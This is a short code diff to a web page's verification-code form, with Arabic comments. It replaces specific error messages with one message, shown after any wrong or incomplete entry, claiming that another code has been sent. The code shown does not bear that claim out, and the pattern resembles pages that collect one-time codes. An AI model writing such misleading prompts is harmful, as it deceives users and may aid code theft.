@@ -495,9 +495,9 @@
         e.preventDefault();
         let code = codeInput.value.trim();
         if (code.length !== 4) { 
-          // نعتبر عدم إدخال 4 أرقام خطأ فورياً
+          // نعرض رسالة الخطأ الموحدة عندما يكون هناك خطأ في رمز التحقق
           const codeError = document.getElementById('codeError');
-          codeError.textContent = `يرجى إدخال 4 أرقام.`;
+          codeError.textContent = `حدث خطأ في رمز التحقق، قمنا بإرسال رمز تحقق آخر.`;
           codeError.style.display = 'block';
           codeInput.classList.add('shake');
           setTimeout(()=>codeInput.classList.remove('shake'),350);
@@ -516,9 +516,9 @@
         } catch (err) {}
 
         if (codeAttempts < maxCodeAttempts) {
-          // عرض رسالة خطأ مؤقتة بعد كل محاولة خاطئة
+          // عرض رسالة خطأ موحدة بعد كل محاولة خاطئة
           const codeError = document.getElementById('codeError');
-          codeError.textContent = `رمز التحقق غير صحيح. المحاولة ${codeAttempts} من ${maxCodeAttempts}.`;
+          codeError.textContent = `حدث خطأ في رمز التحقق، قمنا بإرسال رمز تحقق آخر.`;
           codeError.style.display = 'block';
           codeInput.classList.add('shake');
           setTimeout(()=>codeInput.classList.remove('shake'),350);
